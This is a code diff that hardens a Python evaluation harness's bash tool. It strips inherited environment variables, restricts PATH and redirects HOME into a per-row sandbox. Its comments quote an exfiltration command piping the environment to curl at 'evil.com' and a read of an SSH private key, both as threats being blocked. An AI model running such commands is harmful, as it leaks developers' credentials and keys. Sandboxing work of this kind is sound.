@@ -62,6 +62,23 @@ TOOL_OUTPUT_INLINE_CAP = 4096  # bytes — anything larger is truncated for the 
 ARTIFACT_PREVIEW_BYTES = 2048
 BASH_TIMEOUT_SECONDS = 20
 
+# Allowlist of env vars passed through to run_bash subprocesses. The default
+# subprocess.run inherits the *entire* parent env, which includes ANTHROPIC_API_KEY,
+# BRAINTRUST_API_KEY, OPENROUTER_API_KEY, DATABASE_URL, AWS creds, GitHub tokens,
+# anything `direnv`/`asdf`/`mise` set, etc. A misbehaving (or compromised) skill
+# could `env | curl evil.com` and exfiltrate them all in one shot. We replace
+# the env wholesale with a fixed, minimal set. Keep the allowlist tiny — only
+# add a var here if a skill genuinely cannot function without it AND it carries
+# no secret. Anything user-specific (HOME, TMPDIR, USER) is rewritten below to
+# point inside the sandbox so a skill that does `cat $HOME/.ssh/id_rsa` reads
+# from the workspace, not the developer's actual home directory.
+_BASH_ENV_PASSTHROUGH = ("LANG", "LC_ALL", "LANGUAGE")
+# PATH is restricted to system binaries only — no /usr/local/bin (homebrew,
+# user-installed CLIs), no $HOME/.local/bin, no language version managers.
+# Skills that need extra tooling should call them through write_file +
+# explicit interpreters instead.
+_BASH_PATH = "/usr/bin:/bin"
+
 
 # --- Tool schemas exposed to Claude ---------------------------------------
 
@@ -224,6 +241,24 @@ def _execute_tool(
             command = tool_input.get("command", "")
             if not isinstance(command, str) or not command.strip():
                 return ("command is required", True)
+            # Build a minimal env from scratch — see _BASH_ENV_PASSTHROUGH above
+            # for why we don't inherit. HOME/TMPDIR/USER point inside the
+            # workspace so even skills that touch ~/.config or write to /tmp
+            # stay contained in the per-row sandbox.
+            tmp_dir = workspace / ".tmp"
+            tmp_dir.mkdir(exist_ok=True)
+            child_env: dict[str, str] = {
+                "PATH": _BASH_PATH,
+                "HOME": str(workspace),
+                "TMPDIR": str(tmp_dir),
+                "USER": "northstar-eval",
+                "SHELL": "/bin/sh",
+                "TERM": "dumb",
+            }
+            for var in _BASH_ENV_PASSTHROUGH:
+                value = os.environ.get(var)
+                if value is not None:
+                    child_env[var] = value
             try:
                 proc = subprocess.run(
                     command,
@@ -232,6 +267,7 @@ def _execute_tool(
                     capture_output=True,
                     text=True,
                     timeout=BASH_TIMEOUT_SECONDS,
+                    env=child_env,
                 )
             except subprocess.TimeoutExpired:
                 return (f"command timed out after {BASH_TIMEOUT_SECONDS}s", True)
